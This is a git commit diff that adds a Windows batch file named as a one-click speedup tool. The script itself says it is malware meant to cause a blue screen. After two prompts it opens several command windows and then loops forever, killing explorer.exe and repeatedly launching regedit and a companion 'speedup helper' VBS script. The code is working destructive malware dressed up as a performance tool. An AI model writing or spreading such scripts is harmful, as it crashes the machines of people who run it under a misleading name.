f4d3697d35fb7f79501708c3db5f68b83b9af969
XY-Cherie <134471408+XY-Cherie@users.noreply.github.com>
2023-05-30 18:13:05 +0800

    Add files via upload

---
+++ 一键加速.bat
@@ -0,0 +1,38 @@
+@echo off
+@echo this software is a malware.The software will let your computer blue screen of death.If you don't know what are you execute,please exit,or press ENTER to execute it.DO YOU WANT TO EXECUTE IT?
+pause
+@echo THIS IS THE LAST WARNING!!!DO YOU WANT TO EXECUTE IT?[DON'T PRESS ALT+F4]
+pause
+
+
+
+START CMD.EXE
+START CMD.EXE
+START CMD.EXE
+START CMD.EXE
+START CMD.EXE
+START CMD.EXE
+START CMD.EXE
+START CMD.EXE
+:r
+taskkill /im explorer.exe /f
+start 加速辅助.vbs
+start regedit.exe 
+start 加速辅助.vbs
+taskkill /im regedit.exe /f
+start 加速辅助.vbs
+start regedit.exe 
+start 加速辅助.vbs
+taskkill /im regedit.exe /f
+start 加速辅助.vbs
+start explorer.exe
+start 加速辅助.vbs
+start regedit.exe 
+start 加速辅助.vbs
+taskkill /im regedit.exe /f
+start 加速辅助.vbs
+start regedit.exe 
+start 加速辅助.vbs
+taskkill /im regedit.exe /f
+start 加速辅助.vbs
+goto r
